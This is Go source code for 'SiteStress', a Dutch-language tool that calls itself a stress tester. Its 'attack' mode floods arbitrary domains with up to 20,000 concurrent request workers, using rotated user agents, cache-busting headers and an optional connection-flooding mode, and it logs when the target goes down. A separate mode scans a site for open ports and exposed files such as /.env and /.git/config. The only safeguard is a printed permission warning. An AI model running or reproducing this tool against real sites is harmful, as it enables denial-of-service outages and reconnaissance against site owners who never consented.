package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/miekg/dns"
)

const version = "3.4.5"

func printBanner() {
	fmt.Println("SiteStress (part of Lucas Kit) is made by Lucas Mangroelal | lucasmangroelal.nl")
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
}

func getRandomUserAgent() string {
	return userAgents[rand.Intn(len(userAgents))]
}

type options struct {
	domain        string
	measure       bool
	attackMinutes int
	concurrency   int
	level         int
	noKeepAlive   bool
	outputDir     string
	help          bool
	version       bool

	// New Analysis Flags
	jsonOut      bool
	httpCheck    bool
	tlsCheck     bool
	headersCheck bool
	cacheCheck   bool
	fingerCheck  bool
	portsCheck   bool
	pathsCheck   bool
	corsCheck    bool
	cookieCheck  bool
	probes       int
}

type domainStats struct {
	domain          string
	targetURL       string
	totalRequests   int64
	successRequests int64
	failedRequests  int64
	siteDown        bool
	siteDownSince   time.Time
	mu              sync.Mutex
	statusLog       []string
}

func main() {
	var o options

	flag.StringVar(&o.domain, "d", "", "Domein(en) om te meten of aan te vallen (comma-separated)")
	flag.BoolVar(&o.measure, "measure", false, "Meet de kracht van de site en krijg advies")
	flag.IntVar(&o.attackMinutes, "t", 0, "Aantal minuten om aan te vallen")
	flag.IntVar(&o.concurrency, "c", 0, "Aantal workers (overschrijft level)")
	flag.IntVar(&o.level, "level", 0, "Power Level (1-10). 1=Soft, 5=Medium, 10=EXTREME")
	flag.BoolVar(&o.noKeepAlive, "no-keepalive", false, "Schakel keep-alive uit (forceer nieuwe connecties)")
	flag.StringVar(&o.outputDir, "o", "", "Map om rapport en logs in op te slaan")
	flag.BoolVar(&o.help, "help", false, "Toon help")
	flag.BoolVar(&o.help, "h", false, "Toon help (kort)")
	flag.BoolVar(&o.version, "version", false, "Toon versie")

	// New flags
	flag.BoolVar(&o.jsonOut, "json", false, "Output als JSON")
	flag.BoolVar(&o.httpCheck, "http", false, "Analyseer HTTP redirects en final URL")
	flag.BoolVar(&o.tlsCheck, "tls", false, "Analyseer TLS certificaat info")
	flag.BoolVar(&o.headersCheck, "headers", false, "Analyseer security headers")
	flag.BoolVar(&o.cacheCheck, "cache", false, "Analyseer caching en compressie info")
	flag.BoolVar(&o.fingerCheck, "fingerprint", false, "Lightweight techniek fingerprinting")
	flag.BoolVar(&o.portsCheck, "ports", false, "Analyseer open poorten (21,22,80,443 etc)")
	flag.BoolVar(&o.pathsCheck, "paths", false, "Check veelvoorkomende paden (/robots.txt, etc)")
	flag.BoolVar(&o.corsCheck, "cors", false, "Controleer op permissieve CORS configuraties")
	flag.BoolVar(&o.cookieCheck, "cookies", false, "Analyseer sessie cookies (Secure, HttpOnly, SameSite)")
	flag.IntVar(&o.probes, "probes", 1, "Aantal probes voor measure (default 1)")

	flag.Usage = func() {
		printBanner()
		fmt.Fprintf(os.Stderr, "SiteStress v%s - Advanced HTTP Stress Test Tool\n\n", version)
		fmt.Fprintf(os.Stderr, "Gebruik:\n")
		fmt.Fprintf(os.Stderr, "  1. Meten:\n")
		fmt.Fprintf(os.Stderr, "     sitestress -measure -d <domein>\n\n")
		fmt.Fprintf(os.Stderr, "  2. Aanvallen (Levels):\n")
		fmt.Fprintf(os.Stderr, "     sitestress -d <domein> -t <minuten> -level 5\n")
		fmt.Fprintf(os.Stderr, "     sitestress -d <domein> -t <minuten> -level 10 (EXTREME)\n\n")
		fmt.Fprintf(os.Stderr, "  3. Custom (Advanced):\n")
		fmt.Fprintf(os.Stderr, "     sitestress -d <domein> -t 5 -c 5000 -no-keepalive\n\n")
		fmt.Fprintf(os.Stderr, "Flags:\n")
		flag.PrintDefaults()
	}

	flag.Parse()

	if o.version {
		printBanner()
		fmt.Printf("Version: %s\n", version)
		os.Exit(0)
	}
	if o.help {
		flag.Usage()
		os.Exit(0)
	}

	if o.domain == "" {
		flag.Usage()
		os.Exit(2)
	}

	if !o.jsonOut {
		printBanner()
	}

	// Mode 1: Measurement or Analysis
	if o.measure || o.httpCheck || o.tlsCheck || o.headersCheck || o.cacheCheck || o.fingerCheck || o.portsCheck || o.pathsCheck || o.corsCheck || o.cookieCheck {
		runAnalysis(o)
		return
	}

	// Mode 2: Attack
	if o.attackMinutes <= 0 {
		fmt.Println("❌ Aantal minuten (-t) is vereist voor een aanval.")
		os.Exit(2)
	}

	fmt.Printf("Version: %s | Platform: %s/%s\n", version, runtime.GOOS, runtime.GOARCH)
	fmt.Println("⚠️  WAARSCHUWING: Gebruik dit alleen op systemen waar je toestemming voor hebt.")
	fmt.Println()

	domains := strings.Split(o.domain, ",")
	for i := range domains {
		domains[i] = normalizeDomain(domains[i])
	}

	// Apply Level Logic if -c is not manually set
	applyLevelSettings(&o)

	if o.outputDir != "" {
		if err := os.MkdirAll(o.outputDir, 0755); err != nil {
			fmt.Printf("Fout bij maken output map: %v\n", err)
			os.Exit(1)
		}
	}

	runAttack(domains, o)
}

// Logic to map Level 1-10 to Concurrency
func applyLevelSettings(o *options) {
	if o.concurrency > 0 {
		return // Manual override wins
	}

	if o.level == 0 {
		o.level = 4 // Default if nothing specified
	}

	if o.level < 1 {
		o.level = 1
	}
	if o.level > 10 {
		o.level = 10
	}

	// Scale
	// 1: 50
	// 5: 1000
	// 8: 5000
	// 10: 20000

	switch o.level {
	case 1:
		o.concurrency = 50
	case 2:
		o.concurrency = 150
	case 3:
		o.concurrency = 300
	case 4:
		o.concurrency = 750
	case 5:
		o.concurrency = 1500
	case 6:
		o.concurrency = 3000
	case 7:
		o.concurrency = 5000
	case 8:
		o.concurrency = 8000
	case 9:
		o.concurrency = 12000
	case 10:
		o.concurrency = 20000
	}

	fmt.Printf("🎚️  Power Level: %d -> %d Workers\n", o.level, o.concurrency)
}

func normalizeDomain(d string) string {
	d = strings.TrimSpace(d)
	d = strings.TrimPrefix(d, "http://")
	d = strings.TrimPrefix(d, "https://")
	d = strings.TrimSuffix(d, "/")
	return strings.TrimSuffix(d, ".")
}

func runAnalysis(o options) {
	domain := normalizeDomain(o.domain)
	if !o.jsonOut {
		fmt.Printf("[*] Starting Analysis for target: %s\n", domain)
	}

	outData := make(map[string]interface{})

	ips, err := net.LookupHost(domain)
	if err == nil {
		outData["resolved_ips"] = ips
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // Do not follow redirects automatically to capture the chain
		},
	}

	// 1. Measure
	if o.measure {
		measureData := make(map[string]interface{})
		var latencies []int64
		successProbes := 0
		var server, poweredBy string

		for i := 0; i < o.probes; i++ {
			start := time.Now()
			req, _ := http.NewRequest("GET", "https://"+domain, nil)
			req.Header.Set("User-Agent", getRandomUserAgent())
			resp, err := client.Do(req)
			if err != nil {
				req, _ = http.NewRequest("GET", "http://"+domain, nil)
				req.Header.Set("User-Agent", getRandomUserAgent())
				resp, err = client.Do(req)
			}
			if err == nil {
				duration := time.Since(start)
				latencies = append(latencies, duration.Milliseconds())
				successProbes++
				if server == "" {
					server = resp.Header.Get("Server")
					poweredBy = resp.Header.Get("X-Powered-By")
				}
				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
			}
		}

		measureData["probes_attempted"] = o.probes
		measureData["probes_success"] = successProbes
		measureData["latencies_ms"] = latencies
		measureData["server"] = server
		measureData["powered_by"] = poweredBy

		outData["measure"] = measureData

		if !o.jsonOut {
			fmt.Printf("[*] Probes: %d/%d success\n", successProbes, o.probes)
			if successProbes > 0 {
				fmt.Printf("[*] Server Header: %s\n", server)
				fmt.Printf("[*] X-Powered-By: %s\n", poweredBy)
			}
		}
	}

	// Helper for subsequent HTTP checks
	var doReq = func() (*http.Response, []*http.Response, error) {
		clientWithRedirects := &http.Client{Timeout: 10 * time.Second}
		req, _ := http.NewRequest("GET", "https://"+domain, nil)
		var redirects []*http.Response
		clientWithRedirects.CheckRedirect = func(r *http.Request, via []*http.Request) error {
			redirects = append(redirects, r.Response)
			if len(via) >= 10 {
				return fmt.Errorf("stopped after 10 redirects")
			}
			return nil
		}

		req.Header.Set("User-Agent", "SiteStress-Analysis/1.0")
		resp, err := clientWithRedirects.Do(req)
		if err != nil {
			req, _ = http.NewRequest("GET", "http://"+domain, nil)
			resp, err = clientWithRedirects.Do(req)
		}
		return resp, redirects, err
	}

	// Fetch once for remaining checks
	var resp *http.Response
	var redirects []*http.Response
	var reqErr error
	if o.httpCheck || o.tlsCheck || o.headersCheck || o.cacheCheck || o.fingerCheck {
		resp, redirects, reqErr = doReq()
	}

	// 2. HTTP
	if o.httpCheck {
		httpData := make(map[string]interface{})
		if reqErr != nil {
			httpData["error"] = reqErr.Error()
		} else {
			redirectUrls := []string{}
			for _, r := range redirects {
				if r != nil && r.Request != nil {
					redirectUrls = append(redirectUrls, r.Request.URL.String())
				}
			}
			httpData["final_url"] = resp.Request.URL.String()
			httpData["status_code"] = resp.StatusCode
			httpData["redirect_chain"] = redirectUrls
		}
		outData["http"] = httpData
		if !o.jsonOut && reqErr == nil {
			fmt.Printf("[+] Final URL: %s (Status: %d)\n", resp.Request.URL.String(), resp.StatusCode)
		}
	}

	// 3. TLS
	if o.tlsCheck {
		tlsData := make(map[string]interface{})
		if resp != nil && resp.TLS != nil && len(resp.TLS.PeerCertificates) > 0 {
			cert := resp.TLS.PeerCertificates[0]
			tlsData["issuer"] = cert.Issuer.CommonName
			tlsData["subject"] = cert.Subject.CommonName
			tlsData["valid_from"] = cert.NotBefore
			tlsData["valid_to"] = cert.NotAfter
			tlsData["days_remaining"] = int(time.Until(cert.NotAfter).Hours() / 24)
			tlsData["dns_names"] = cert.DNSNames
		} else {
			tlsData["error"] = "No TLS connection or certificates found"
		}
		outData["tls"] = tlsData
		if !o.jsonOut && tlsData["issuer"] != nil {
			fmt.Printf("[+] TLS Cert Issuer: %s, Valid To: %v\n", tlsData["issuer"], tlsData["valid_to"])
		}
	}

	// 4. Headers
	if o.headersCheck {
		headersData := make(map[string]interface{})
		if resp != nil {
			headersData["hsts"] = resp.Header.Get("Strict-Transport-Security")
			headersData["csp"] = resp.Header.Get("Content-Security-Policy")
			headersData["x_frame_options"] = resp.Header.Get("X-Frame-Options")
			headersData["x_content_type_options"] = resp.Header.Get("X-Content-Type-Options")
			headersData["referrer_policy"] = resp.Header.Get("Referrer-Policy")
			headersData["permissions_policy"] = resp.Header.Get("Permissions-Policy")

			rawCookies := resp.Header.Values("Set-Cookie")
			cookiesList := []map[string]bool{}
			for _, c := range rawCookies {
				cData := map[string]bool{
					"secure":   strings.Contains(strings.ToLower(c), "secure"),
					"httponly": strings.Contains(strings.ToLower(c), "httponly"),
					"samesite": strings.Contains(strings.ToLower(c), "samesite"),
				}
				cookiesList = append(cookiesList, cData)
			}
			headersData["cookie_flags"] = cookiesList
		}
		outData["headers"] = headersData
	}

	// 5. Cache
	if o.cacheCheck {
		cacheData := make(map[string]interface{})
		if resp != nil {
			cacheData["cache_control"] = resp.Header.Get("Cache-Control")
			cacheData["etag"] = resp.Header.Get("ETag")
			cacheData["last_modified"] = resp.Header.Get("Last-Modified")
			cacheData["content_encoding"] = resp.Header.Get("Content-Encoding")
		}
		outData["cache"] = cacheData
	}

	// 6. Fingerprint
	if o.fingerCheck {
		fingerData := make(map[string]interface{})
		if resp != nil {
			fingerData["server"] = resp.Header.Get("Server")
			fingerData["x_powered_by"] = resp.Header.Get("X-Powered-By")
			fingerData["x_generator"] = resp.Header.Get("X-Generator")

			// Light HTML inspect for generator
			if resp.Body != nil {
				bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
				bodyStr := string(bodyBytes)
				if idx := strings.Index(strings.ToLower(bodyStr), `<meta name="generator"`); idx != -1 {
					substr := bodyStr[idx:]
					if endIdx := strings.Index(substr, ">"); endIdx != -1 {
						fingerData["meta_generator"] = substr[:endIdx+1]
					}
				}
				resp.Body.Close()
			}
		}
		outData["fingerprint"] = fingerData
	}

	// 7. Ports
	if o.portsCheck {
		portsData := []int{}
		commonPorts := []int{21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 993, 3306, 3389, 5432, 8080, 8443}

		var wg sync.WaitGroup
		var mu sync.Mutex

		for _, port := range commonPorts {
			wg.Add(1)
			go func(p int) {
				defer wg.Done()
				address := fmt.Sprintf("%s:%d", domain, p)
				conn, err := net.DialTimeout("tcp", address, 2*time.Second)
				if err == nil {
					conn.Close()
					mu.Lock()
					portsData = append(portsData, p)
					mu.Unlock()
				}
			}(port)
		}
		wg.Wait()
		outData["open_ports"] = portsData
		if !o.jsonOut {
			fmt.Printf("[+] Open Ports: %v\n", portsData)
		}
	}

	// 8. Paths
	if o.pathsCheck {
		pathsData := make(map[string]int)
		commonPaths := []string{
			"/robots.txt",
			"/sitemap.xml",
			"/.well-known/security.txt",
			"/.git/config",
			"/.env",
		}

		clientPaths := &http.Client{
			Timeout: 3 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}

		var wg sync.WaitGroup
		var mu sync.Mutex

		for _, p := range commonPaths {
			wg.Add(1)
			go func(path string) {
				defer wg.Done()
				url := "https://" + domain + path
				req, _ := http.NewRequest("GET", url, nil)
				req.Header.Set("User-Agent", "SiteStress-Analysis/1.0")
				res, err := clientPaths.Do(req)
				if err != nil {
					// Fallback to HTTP
					url = "http://" + domain + path
					req, _ = http.NewRequest("GET", url, nil)
					req.Header.Set("User-Agent", "SiteStress-Analysis/1.0")
					res, err = clientPaths.Do(req)
				}
				if err == nil {
					mu.Lock()
					pathsData[path] = res.StatusCode
					mu.Unlock()
					io.Copy(io.Discard, res.Body)
					res.Body.Close()
				}
			}(p)
		}
		wg.Wait()
		outData["paths"] = pathsData
		if !o.jsonOut {
			fmt.Printf("[+] Interesting Paths Discovered.\n")
		}
	}

	// 9. CORS Check
	if o.corsCheck {
		corsData := make(map[string]interface{})
		clientCors := &http.Client{Timeout: 5 * time.Second}
		req, _ := http.NewRequest("OPTIONS", "https://"+domain, nil)
		req.Header.Set("Origin", "https://evil.lucaskit.com")
		req.Header.Set("Access-Control-Request-Method", "POST")
		res, err := clientCors.Do(req)
		if err == nil {
			corsData["allow_origin"] = res.Header.Get("Access-Control-Allow-Origin")
			corsData["allow_credentials"] = res.Header.Get("Access-Control-Allow-Credentials")
			io.Copy(io.Discard, res.Body)
			res.Body.Close()
		} else {
			corsData["error"] = err.Error()
		}
		outData["cors"] = corsData
		if !o.jsonOut && corsData["allow_origin"] != "" {
			fmt.Printf("[+] CORS ACAO: %s\n", corsData["allow_origin"])
		}
	}

	// 10. Cookie Security Check
	if o.cookieCheck && resp != nil {
		cookieData := []map[string]interface{}{}
		for _, cookie := range resp.Cookies() {
			cMap := map[string]interface{}{
				"name":     cookie.Name,
				"secure":   cookie.Secure,
				"httponly": cookie.HttpOnly,
				"samesite": int(cookie.SameSite),
			}
			cookieStr := "None/Default"
			if cookie.SameSite == http.SameSiteLaxMode {
				cookieStr = "Lax"
			}
			if cookie.SameSite == http.SameSiteStrictMode {
				cookieStr = "Strict"
			}
			cMap["samesite_string"] = cookieStr
			cookieData = append(cookieData, cMap)
		}
		outData["cookies"] = cookieData
		if !o.jsonOut && len(cookieData) > 0 {
			fmt.Printf("[+] Analysed %d cookies.\n", len(cookieData))
		}
	}

	if resp != nil && resp.Body != nil {
		resp.Body.Close()
	}

	if o.jsonOut {
		b, err := json.MarshalIndent(outData, "", "  ")
		if err != nil {
			fmt.Fprintf(os.Stderr, "json error: %v\n", err)
		} else {
			fmt.Println(string(b))
		}
	} else if !o.measure && !o.httpCheck && !o.tlsCheck && !o.headersCheck && !o.cacheCheck && !o.fingerCheck && !o.portsCheck && !o.pathsCheck && !o.corsCheck && !o.cookieCheck {
		fmt.Println("No analysis flags provided.")
	}
}

func startHealthMonitor(s *domainStats, deadline time.Time) {
	// Separate client for monitoring - clean state
	// Ensure we don't use the same overloaded transport as the attackers
	monitorClient := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			DisableKeepAlives: true,  // Force fresh connection
			ForceAttemptHTTP2: false, // Simple HTTP/1.1 check usually reliable
		},
	}

	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	// Wait a bit before first check
	time.Sleep(1 * time.Second)

	for time.Now().Before(deadline) {
		<-ticker.C

		req, _ := http.NewRequest("GET", s.targetURL, nil)
		// Unique Agent so we can distinguish logs if needed
		req.Header.Set("User-Agent", "SiteStress-Monitor/1.0")

		resp, err := monitorClient.Do(req)

		s.mu.Lock()
		wasDown := s.siteDown
		s.mu.Unlock()

		if err != nil {
			// Monitor failed! Only NOW we say it's down.
			// This confirms it's not just local port exhaustion (hopefully monitorClient can finds a gap)
			if !wasDown {
				s.mu.Lock()
				if !s.siteDown {
					s.siteDown = true
					s.siteDownSince = time.Now()
					// Simplify error message
					errMsg := fmt.Sprintf("%v", err)
					if strings.Contains(errMsg, "timeout") {
						errMsg = "Timeout"
					}
					msg := fmt.Sprintf("[%s] 💥 %s is DOWN (Health Check Failed: %s)!", time.Now().Format(time.TimeOnly), s.domain, errMsg)
					s.statusLog = append(s.statusLog, msg)
					fmt.Println("\n" + msg)
				}
				s.mu.Unlock()
			}
		} else {
			resp.Body.Close()
			if resp.StatusCode >= 500 {
				// Server Error
				if !wasDown {
					s.mu.Lock()
					if !s.siteDown {
						s.siteDown = true
						s.siteDownSince = time.Now()
						msg := fmt.Sprintf("[%s] 💥 %s is DOWN (Status %d)!", time.Now().Format(time.TimeOnly), s.domain, resp.StatusCode)
						s.statusLog = append(s.statusLog, msg)
						fmt.Println("\n" + msg)
					}
					s.mu.Unlock()
				}
			} else {
				// Site is UP
				if wasDown {
					s.mu.Lock()
					if s.siteDown {
						downTime := time.Since(s.siteDownSince).Round(time.Second)
						s.siteDown = false
						msg := fmt.Sprintf("[%s] ✅ %s is weer ONLINE (was %v plat).", time.Now().Format(time.TimeOnly), s.domain, downTime)
						s.statusLog = append(s.statusLog, msg)
						fmt.Println("\n" + msg)
					}
					s.mu.Unlock()
				}
			}
		}
	}
}

func runAttack(domains []string, o options) {
	duration := time.Duration(o.attackMinutes) * time.Minute
	deadline := time.Now().Add(duration)

	workersPerDomain := o.concurrency

	// Sterk getunede HTTP client
	transport := &http.Transport{
		MaxIdleConns:        workersPerDomain * len(domains),
		MaxIdleConnsPerHost: workersPerDomain,
		IdleConnTimeout:     90 * time.Second,
		DisableKeepAlives:   o.noKeepAlive,
		ForceAttemptHTTP2:   true,
	}

	httpClient := &http.Client{
		Timeout:   5 * time.Second,
		Transport: transport,
	}

	// Setup DNS resolver (8.8.8.8 default)
	dnsClient := &dns.Client{Timeout: 2 * time.Second}
	resolver := "8.8.8.8:53"

	allStats := make([]*domainStats, len(domains))

	// Initial checks
	for i, domain := range domains {
		fmt.Printf("🔍 Initiele check voor %s...\n", domain)

		// DNS lookup
		var targetIPs []string
		m := new(dns.Msg)
		m.SetQuestion(dns.Fqdn(domain), dns.TypeA)
		in, _, err := dnsClient.Exchange(m, resolver)
		if err == nil && len(in.Answer) > 0 {
			for _, ans := range in.Answer {
				if a, ok := ans.(*dns.A); ok {
					targetIPs = append(targetIPs, a.A.String())
				}
			}
		}

		if len(targetIPs) == 0 {
			// Fallback: system lookup
			ips, _ := net.LookupHost(domain)
			if len(ips) > 0 {
				targetIPs = ips
			} else {
				fmt.Printf("⚠️  Geen IP adressen gevonden voor %s, we proberen het toch.\n", domain)
			}
		} else {
			fmt.Printf("📍 IPs: %s\n", strings.Join(targetIPs, ", "))
		}

		// URL bepalen
		urls := []string{"https://" + domain, "http://" + domain}
		var targetURL string
		for _, u := range urls {
			req, _ := http.NewRequest("GET", u, nil)
			req.Header.Set("User-Agent", getRandomUserAgent())
			resp, err := httpClient.Do(req)
			if err == nil {
				targetURL = u
				resp.Body.Close()
				break
			}
		}
		if targetURL == "" {
			targetURL = urls[0] // Fallback
		}

		allStats[i] = &domainStats{
			domain:    domain,
			targetURL: targetURL,
		}
		fmt.Printf("🎯 Target: %s\n", targetURL)
	}

	// Start Health Monitors (New in v3.4.1)
	fmt.Println("🏥 Starting separate Health Monitors to avoid false positives...")
	for _, stats := range allStats {
		if stats == nil {
			continue
		}
		go startHealthMonitor(stats, deadline)
	}

	fmt.Printf("\n🚀 Starten aanval (%d workers per domein)...\n", workersPerDomain)
	if o.noKeepAlive {
		fmt.Println("🔥 Mode: No-KeepAlive (Connection flooding)")
	} else {
		fmt.Println("🌊 Mode: Keep-Alive (High throughput)")
	}
	fmt.Printf("⏱️  Totale tijd: %d minuten\n", o.attackMinutes)

	var globalWg sync.WaitGroup

	for _, stats := range allStats {
		if stats == nil {
			continue
		}
		s := stats
		for w := 0; w < workersPerDomain; w++ {
			globalWg.Add(1)
			go func() {
				defer globalWg.Done()

				for time.Now().Before(deadline) {
					req, _ := http.NewRequest("GET", s.targetURL, nil)
					req.Header.Set("User-Agent", getRandomUserAgent())
					req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")

					resp, err := httpClient.Do(req)

					// NOTE (v3.4.1): We NO LONGER check for down status here.
					// At high concurrency, local errors (socket exhaustion) are common.
					// We leave the up/down judgment to the Health Monitor goroutine.

					if err != nil {
						// Attack failed (likely local limit or site down)
						atomic.AddInt64(&s.failedRequests, 1)
					} else {
						io.Copy(io.Discard, resp.Body)
						resp.Body.Close()

						if resp.StatusCode >= 500 || resp.StatusCode == 429 {
							atomic.AddInt64(&s.failedRequests, 1)
						} else {
							atomic.AddInt64(&s.successRequests, 1)
						}
					}
					atomic.AddInt64(&s.totalRequests, 1)
				}
			}()
		}
	}

	// Monitor loop - only for UI updates now
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	// Hier wachten we tot tijd voorbij is OF interrupt
	startTime := time.Now()
loop:
	for {
		select {
		case <-ticker.C:
			remaining := time.Until(deadline).Round(time.Second)
			if remaining <= 0 {
				break loop
			}
			elapsed := time.Since(startTime).Seconds()

			var totalReqs int64
			for _, s := range allStats {
				if s != nil {
					totalReqs += atomic.LoadInt64(&s.totalRequests)
				}
			}
			rps := float64(totalReqs) / elapsed

			fmt.Printf("\r⏳ Nog: %v | RPS: %.0f | ", remaining, rps)
			for i, s := range allStats {
				if s == nil {
					continue
				}
				if i > 0 {
					fmt.Print(" | ")
				}

				s.mu.Lock()
				status := "🟢"
				if s.siteDown {
					status = "🔴"
				}
				s.mu.Unlock()

				fmt.Printf("%s: %s (%d fail)", s.domain, status, atomic.LoadInt64(&s.failedRequests))
			}
		}
		if time.Now().After(deadline) {
			break
		}
	}

	fmt.Println("\n\n🛑 Tijd is om. Wachten op workers (kan even duren)...")
	globalWg.Wait()

	// Rapport genereren
	generateReport(allStats, o.outputDir, o.attackMinutes)
}

func generateReport(stats []*domainStats, outputDir string, minutes int) {
	fmt.Println("\n📊 EINDRESULTATEN")

	reportLines := []string{}
	reportLines = append(reportLines, fmt.Sprintf("SITESTRESS RAPPORT - %s", time.Now().Format(time.RFC1123)))
	reportLines = append(reportLines, fmt.Sprintf("Duur test: %d minuten", minutes))
	reportLines = append(reportLines, strings.Repeat("-", 50))

	for _, s := range stats {
		if s == nil {
			continue
		}

		total := atomic.LoadInt64(&s.totalRequests)
		success := atomic.LoadInt64(&s.successRequests)
		fail := atomic.LoadInt64(&s.failedRequests)

		summary := fmt.Sprintf("\nDOMEIN: %s", s.domain)
		fmt.Println(summary)
		reportLines = append(reportLines, summary)

		line1 := fmt.Sprintf("   Requests Totaal: %d", total)
		line2 := fmt.Sprintf("   Geslaagd (Up):   %d", success)
		line3 := fmt.Sprintf("   Gefaald (Down):  %d", fail)

		fmt.Println(line1)
		fmt.Println(line2)
		fmt.Println(line3)

		reportLines = append(reportLines, line1, line2, line3)
		reportLines = append(reportLines, "   Logboek:")

		s.mu.Lock()
		if len(s.statusLog) == 0 {
			msg := "   (Geen downtime events geregistreerd)"
			fmt.Println(msg)
			reportLines = append(reportLines, msg)
		} else {
			for _, log := range s.statusLog {
				fmt.Printf("   %s\n", log)
				reportLines = append(reportLines, "   "+log)
			}
		}
		s.mu.Unlock()
	}

	if outputDir != "" {
		fPath := filepath.Join(outputDir, fmt.Sprintf("report_%d.txt", time.Now().Unix()))
		f, err := os.Create(fPath)
		if err != nil {
			fmt.Printf("\n⚠️  Kon rapport niet opslaan: %v\n", err)
			return
		}
		defer f.Close()

		for _, line := range reportLines {
			f.WriteString(line + "\n")
		}
		fmt.Printf("\n💾 Rapport opgeslagen in: %s\n", fPath)
	}
}
